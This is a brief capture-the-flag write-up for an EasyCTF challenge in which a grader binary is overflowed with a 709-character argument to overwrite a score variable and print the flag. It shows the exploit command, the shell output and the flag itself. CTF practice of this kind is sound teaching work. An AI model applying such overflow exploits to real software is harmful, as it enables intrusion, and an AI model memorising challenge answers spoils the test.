Description:
```
I suck at AP Lit (what is engwrish). I was able to steal the grader for the AP Lit test from the CollageBored, but it's not helping me do any better. Can you help me?

Source can be found here, and the binary with the actual flag is on the shell server at /problems/aplit.
```
Hint:
```
Oh poop! Forgot to give you my prompt. Here it is: Choose a novel that you hate, and then write an essay about it.
```
This is actually easier than the previous buffer overflow problem. From the source we can see that the buffer is 700 bytes long. It can be filled this way:
```
./aplit $(python -c 'print "A"*700')
```
After few tries we manage to overwrite the score:
```
user6ad18@shell:/problems/aplit$ ./aplit $(python -c 'print "A"*709')
...
According to our analysis, your response received a grade of 65!
Wow, you're an HONOR student! Here's a flag: easyctf{essays_are_too_hard}
```
